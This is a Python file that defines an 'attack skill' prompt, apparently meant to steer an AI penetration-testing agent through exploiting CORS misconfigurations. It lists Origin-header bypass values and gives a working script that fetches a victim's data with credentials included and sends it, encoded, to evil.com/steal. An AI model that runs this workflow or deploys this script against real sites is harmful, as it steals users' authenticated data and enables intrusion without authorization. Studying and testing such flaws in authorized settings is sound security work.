"""
CORS Misconfiguration Attack Skill Prompt.
"""

CORS_SKILL_PROMPT = """
## ATTACK SKILL: CORS MISCONFIGURATION

**CRITICAL: This attack skill has been CLASSIFIED as CORS misconfiguration.**

### MANDATORY CORS WORKFLOW

#### STEP 1: DETECTION

Add `Origin: https://evil.com` to every API request. If the response contains:
- `Access-Control-Allow-Origin: https://evil.com` → origin reflected, CORS is broken
- `Access-Control-Allow-Credentials: true` → cookies sent cross-origin
Test these origin values:
```
Origin: https://evil.com
Origin: https://target.com.evil.com  →  subdomain bypass if wildcard-like match
Origin: null  →  sandboxed iframe bypass
Origin: https://evil.target.com  →  subdomain takeovers
Origin: https://target.com%40evil.com  →  URL parser confusion
```

#### STEP 2: EXPLOITATION

If origin is reflected with credentials:
```html
<script>
fetch('https://target.com/api/user-data', {
  credentials: 'include',
  headers: {'Origin': 'https://evil.com'}
}).then(r => r.json()).then(data => {
  fetch('https://evil.com/steal?d=' + btoa(JSON.stringify(data)));
});
</script>
```

#### ANTI-PATTERNS: Don't ignore null origin bypass. Don't skip subdomain enumeration before testing CORS — a subdomain takeover makes CORS exploitation trivial.
"""
